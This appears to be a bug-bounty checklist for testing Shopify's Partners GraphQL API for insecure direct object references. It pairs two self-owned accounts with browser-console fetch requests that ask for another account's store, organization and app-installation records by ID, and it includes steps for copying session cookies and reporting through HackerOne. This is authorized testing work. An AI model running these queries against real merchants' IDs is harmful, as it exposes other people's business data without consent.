# Shopify Partner IDOR Testing Checklist

## Phase 1: Account Setup

### Account A (Your Primary Testing Account)
- [ ] Create Shopify Partner account at https://partners.shopify.com/signup
- [ ] Use your HackerOne-registered email
- [ ] Create a development store
- [ ] Add sample products and create test orders
- [ ] Note Organization ID from URL: `partners.shopify.com/{ORG_ID}/...`
- [ ] Note Store ID from API responses or URL

### Account B (Simulated Victim Account)
- [ ] Create second Partner account with different email
- [ ] Create development store with different data
- [ ] Note Organization ID: ____________
- [ ] Note Store ID: ____________

---

## Phase 2: Session Capture

### Browser Method (Easiest)
1. Log into Account A at partners.shopify.com
2. Open DevTools (F12)
3. Go to Application → Cookies → partners.shopify.com
4. Copy these cookies:
   - `_shopify_partners_session`
   - Any other session-related cookies

### Export Cookie String
Format: `cookie_name=value; cookie_name2=value2`

**Account A Cookie:**
```
_shopify_partners_session=______________
```

**Account B Cookie:**
```
_shopify_partners_session=______________
```

---

## Phase 3: GraphQL Endpoint Discovery

### Observe Normal Traffic
1. In DevTools, go to Network tab
2. Filter by "graphql"
3. Browse around the Partners dashboard
4. Click on Apps, Stores, Analytics
5. Note the GraphQL queries being made

### Key Endpoints to Observe
- [ ] `/api/graphql` - Main Partners API
- [ ] Check for query names containing "store", "organization", "app"
- [ ] Look for ID parameters in query variables

---

## Phase 4: Manual IDOR Testing

### Test 1: Store Access via ID

**Setup:**
- Logged in as Account A
- Target: Account B's Store ID

**Request (modify in DevTools Console or Burp):**
```javascript
// In browser console while logged into Account A
fetch('/api/graphql', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({
    query: `query {
      store(id: "gid://partners/Store/ACCOUNT_B_STORE_ID") {
        id
        name
        myshopifyDomain
      }
    }`
  })
}).then(r => r.json()).then(console.log);
```

**Expected (Secure):**
```json
{
  "data": { "store": null },
  "errors": [{ "message": "Store not found or access denied" }]
}
```

**Vulnerable:**
```json
{
  "data": {
    "store": {
      "id": "gid://partners/Store/XXXXX",
      "name": "Account B's Store",
      "myshopifyDomain": "account-b-store.myshopify.com"
    }
  }
}
```

### Test 2: Organization Cross-Access

```javascript
fetch('/api/graphql', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({
    query: `query {
      organization(id: "gid://partners/Organization/ACCOUNT_B_ORG_ID") {
        id
        name
        stores(first: 10) {
          edges { node { id name } }
        }
      }
    }`
  })
}).then(r => r.json()).then(console.log);
```

### Test 3: App Installation Access

```javascript
fetch('/api/graphql', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({
    query: `query {
      appInstallation(id: "gid://partners/AppInstallation/FOREIGN_INSTALLATION_ID") {
        id
        app { name }
        store { name myshopifyDomain }
      }
    }`
  })
}).then(r => r.json()).then(console.log);
```

---

## Phase 5: Results Recording

### For Each Test, Record:

| Field | Value |
|-------|-------|
| Test Name | |
| Timestamp | |
| Logged In As | Account A / B |
| Target ID | |
| Expected Result | |
| Actual Result | |
| Status Code | |
| Data Returned? | Yes / No |
| IDOR Confirmed? | Yes / No |

### Evidence Collection

If IDOR is confirmed:
- [ ] Screenshot of request (redact sensitive data)
- [ ] Screenshot of response showing foreign data
- [ ] Export HAR file from DevTools
- [ ] Video recording if complex flow

---

## Phase 6: Validation

Before reporting, validate:

- [ ] Repeated test 3 times with consistent results
- [ ] Confirmed target store belongs to different account
- [ ] Data returned is actually from foreign store (not cached/placeholder)
- [ ] No possibility this is intended behavior

---

## Phase 7: Report Submission

If vulnerability confirmed:

1. Document minimal reproduction steps
2. Prepare PoC (single request showing issue)
3. Draft report using template in `report_template.md`
4. Submit via https://hackerone.com/shopify
5. Do NOT test further on production stores

---

## Quick Reference: GID Formats

```
Store:        gid://partners/Store/{numeric_id}
Organization: gid://partners/Organization/{numeric_id}
App:          gid://partners/App/{numeric_id}
Installation: gid://partners/AppInstallation/{numeric_id}
```

---

## Safety Reminders

- Only test on YOUR development stores
- Never access real merchant data
- Stop immediately if you access unintended data
- Report promptly upon confirmation
- Maintain confidentiality until resolved
